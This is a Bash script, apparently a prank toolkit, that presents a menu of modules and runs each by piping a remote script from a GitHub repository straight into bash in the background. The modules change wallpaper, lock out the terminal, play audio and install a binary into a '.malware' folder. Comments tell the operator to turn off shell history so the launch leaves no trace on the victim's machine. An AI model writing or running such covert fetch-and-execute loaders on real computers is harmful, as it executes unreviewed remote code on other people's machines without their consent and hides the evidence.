#!/bin/bash

# !! Only compatible with Bash 4.0+ !!

# Blinks the screen to indicate that the script has started
xrandr --output HDMI-2 --brightness 0 2>/dev/null
sleep 0.01
xrandr --output HDMI-2 --brightness 1 2>/dev/null

# Base URL
github_raw="https://raw.githubusercontent.com/heixier/pranks/refs/heads/main"

# Modules
wallpaper="$github_raw/wallpaper/change_bg.sh"
profile="$github_raw/change_pic.sh"
parrot="$github_raw/parrot/parrot.sh"
lockout="$github_raw/lockout/lockout.sh"
flashbang="$github_raw/flashbang/flashbang.sh"
matrix="$github_raw/matrix/Makefile"
jam="$github_raw/audio/bg_play.sh"
event="$github_raw/wallpaper/anime_C/0.jpg"

# Menu for selecting which scripts to run

# Note: to execute this script, run "set +o history" to prevent menu.sh from being saved to history
# Then launch menu.sh with a space appended to it to prevent it from being saved to readline

# Environment setup

# See which terminals exist on the user's machine
if command -v "gnome-terminal" >/dev/null; then
	src_launch="gnome-terminal --title="hallo" --"
elif command -v "konsole" >/dev/null; then
	src_launch="konsole -p tabtitle=hallo -e"
else
	src_launch=""
fi;

# Functions
options=()

default() {
	profile
	wallpaper
	parrot
}
options+=("default")

wallpaper() {
	bash <(curl -s "$wallpaper") & disown
}
options+=("wallpaper")

profile() {
	bash <(curl -s "$wallpaper") & disown
}
options+=("profile")

parrot() {
	bash <(curl -s "$parrot") & disown
}
options+=("parrot")

jam() {
	bash <(curl -s "$jam") 30 & disown
}
options+=("jam")

lockout() {
	if [ "$src_launch" ] ; then
		local temp_rc=.lockoutrc
		cat <(curl -s $lockout) > $temp_rc
		$src_launch bash --rcfile $temp_rc -i && rm $temp_rc 2>/dev/null & disown
	else
		printf "wat da hell is this distro bro\n" # if typical terminals don't exist
	fi
}
options+=("lockout")

flashbang() {
	bash <(curl -s "$flashbang") & disown
}
options+=("flashbang")

matrix() {
	curl -s -L $matrix -o Makefile && make && make install && rm Makefile && 
		$src_launch bash -c "/home/"$USER"/.malware/ascii_matrix -m1 grey; exec bash"
	printf "Done! Type 'matrix' in a new terminal to launch!\n"
}
options+=("matrix")

event() {
	dest="/tmp/eventimg"
	curl -s -L "https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/wallpaper/anime_C/0.jpg" -o "$dest" && eog -f "$dest" & disown
}
options+=("event")

## Initialising state

# Automatically proceed with defaults if no argument is selected
grub() {
	local manual_input
	read -t 2 -p "" manual_input

	if [[ $manual_input ]]; then
		select_option "$manual_input"
	else
		select_option "default"
	fi
}

# Runs all the options detached so they don't have to wait for each other
select_option() {

	# Convert all numbers to their respective options
	local input
	if [[ $1 =~ ^[0-9]+$ ]]; then
		input="${options[$1]}"
	else
		input="$1"
	fi

	# Run the option if it exists
	for option in "${options[@]}"
	do
		if [[ "$input" == "$option" ]]; then
			$option
		fi
	done
}

print_options() {
	local idx=0
	for arg in "${options[@]}"; do
		printf "%d: $arg\n" $idx
		idx=$(( idx + 1))
	done
}

# Execution
main () {
	if [[ "$1" == "debug" ]]; then
		print_options
	else
		if ! [[ $1 ]]; then
			grub
		else
			for opt in "$@"
			do
				select_option "$opt"
			done
		fi
	fi
}

main "$@"
